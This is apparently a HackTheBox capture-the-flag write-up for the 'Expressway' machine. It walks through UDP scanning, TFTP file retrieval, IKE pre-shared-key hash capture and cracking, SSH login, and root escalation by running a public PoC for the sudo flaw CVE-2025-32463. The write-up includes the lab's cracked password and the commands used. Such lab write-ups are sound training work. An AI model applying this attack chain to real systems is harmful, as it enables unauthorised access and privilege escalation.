# Expressway - Easy

Target IP: **10.129.65.67**

## User Flag

Initial scan: ```sudo nmap -sC -sV 10.129.65.67 -v```

Output only shows port 22 for ssh, running OpenSSH 10.0p2 on Debian.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This is a bit unusual, let's scan UDP ports as well.

```
sudo nmap -sU -sV --top-ports 100 10.129.65.67 -v -T4
```

We see a lot of results.

```
PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open          isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
```

My initial thought is that port 500 is open, and we might find something in the TFTP service on port 69.

Enumerating using the ```tftp-enum``` NSE script, we find a file name on the server.

```
PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum: 
|_  ciscortr.cfg
```

Let's grab it.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ tftp 10.129.65.67
tftp> get ciscortr.cfg
tftp> quit
```

We find a potential ```ike``` user on listed on the file.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ cat ciscortr.cfg | grep -E "user|pass"
no service password-encryption
enable password *****
username ike password *****
	key secret-password
	group 2 key secret-password
	password *****
	password *****
```

We can connect to port 500, but it doesn't return anything useful nor do I know how to navigate this.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ nc -v -u 10.129.65.67 500
Connection to 10.129.65.67 500 port [udp/isakmp] succeeded!
```

Let's consult Google. According to HackTricks, we need to find a valid transformation so that the server talks to us. We can use ```ike-scan```.

Apparently, this result is good. Since the server returned a handshake, the target is configured for IPSec and willing to perform IKE negotation, meaning that we found the correct transform. Additionally, we see that authentication is set using a pre-shared key.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ sudo ike-scan -M 10.129.65.67
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.65.67	Main Mode Handshake returned
	HDR=(CKY-R=bf99c6fe55adc6b5)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.015 seconds (66.49 hosts/sec).  1 returned handshake; 0 returned notify
```

We can get the psk hash.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ sudo ike-scan -A 10.129.65.67 --pskcrack
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.65.67	Aggressive Mode Handshake returned HDR=(CKY-R=e4b1cc509513be64) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
e7cefc33cd71380359c776cc1596a3bc381bdade7274775bb50d36b015c92edc929449970b7639cfc9607c0501773c8053f1ae1da8ade939134dee6588caca917e503fa092336aecfb1c6e50dd37372d20312e8c18479a89fea0f30266a258458b083564df4852577516f5b0d6afe0d5843264319938079d6c1206073714169e:419fca22df6041e862b170c4256f1d0bf9e6de221052d3cf5beb2469333c4261229ebf55a2de3e58137b3d7b2d95dc004aa2c4ab9de0fa403e6ae2575f2bc918d3954ee0ced77e6440ea86908720fca116059297fcb67f134e51f7cb8928cf92915101019dbbcc6179d1e805fd228d99789df4758c5b95a79ef63c2657aaea68:e4b1cc509513be64:b82333d781e81d78:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:b863bfaa1ff86ed5a3bf36675bb9ce9c4e20aa43:05ee1eef9e03b3201e94a8a06bed7097cdf4c29a005487e5a15a8c3d246c0760:eef6e7d071a8b89a6e6a01a5c88d985692f2a779
Ending ike-scan 1.9.6: 1 hosts scanned in 0.018 seconds (55.23 hosts/sec).  1 returned handshake; 0 returned notify
```

We can crack this using hashcat.

```
e7cefc33cd71380359c776cc1596a3bc381bdade7274775bb50d36b015c92edc929449970b7639cfc9607c0501773c8053f1ae1da8ade939134dee6588caca917e503fa092336aecfb1c6e50dd37372d20312e8c18479a89fea0f30266a258458b083564df4852577516f5b0d6afe0d5843264319938079d6c1206073714169e:419fca22df6041e862b170c4256f1d0bf9e6de221052d3cf5beb2469333c4261229ebf55a2de3e58137b3d7b2d95dc004aa2c4ab9de0fa403e6ae2575f2bc918d3954ee0ced77e6440ea86908720fca116059297fcb67f134e51f7cb8928cf92915101019dbbcc6179d1e805fd228d99789df4758c5b95a79ef63c2657aaea68:e4b1cc509513be64:b82333d781e81d78:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:b863bfaa1ff86ed5a3bf36675bb9ce9c4e20aa43:05ee1eef9e03b3201e94a8a06bed7097cdf4c29a005487e5a15a8c3d246c0760:eef6e7d071a8b89a6e6a01a5c88d985692f2a779:freakingrockstarontheroad
```

Let's connect to the remote machine with ssh with this password and the previously found user.

We're in!

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@pwnbox7]─[~]
└──╼ [★]$ ssh ike@10.129.65.67
ike@10.129.65.67's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 18 23:16:50 2026 from 10.10.15.194
ike@expressway:~$ 
```

We can proceed to get the user flag from here.

## Root Flag

```sudo -l``` tells us we can't run ```sudo```.

Looking for binaries with the SUID bit set, I see ```exim4```, which is something I haven't seen before.

```
ike@expressway:~$ find / -type f -perm -4000 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

This is curious. Let's run it and see the version number.

```
ike@expressway:~$ /usr/sbin/exim4 --version
Exim version 4.98.2 #2 built 14-Aug-2025 11:58:16
Copyright (c) University of Cambridge, 1995 - 2018
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2024
Hints DB:
 Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages TLS_resume DANE DKIM DNSSEC ESMTP_Limits ESMTP_Wellknown Event I18N OCSP PIPECONNECT PRDR Queue_Ramp SOCKS SRS TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 external plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file search path is /etc/exim4/exim4.conf:/var/lib/exim4/config.autogenerated
Configuration file is /var/lib/exim4/config.autogenerated
```

Looks like it's running version 4.98.2. I wonder if there are any publicly disclosed vulnerabilities.

A search returns that this version is vulnerable to CVE-2026-45195, a UAF vulnerability that allows us to run arbitrary code.

However, I tried to run some PoCs, and this didn't seem like what we we're looking for.

Running ```linpeas.sh``` doesn't get us any particularly interesting information. I wonder if the vector is more simple.

Checking ```sudo -V``` returns version 1.9.17. I wonder if this version has any publicly known vulnerabilities.

Apparently it's vulnerable to CVE-2025-32463, a local privilege escalation vulnerability.

I found a [PoC] here, let's use it.

```
ike@expressway:~$ ./sudo-chwoot.sh 
woot!
root@expressway:/# whoami
root
```

We can get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
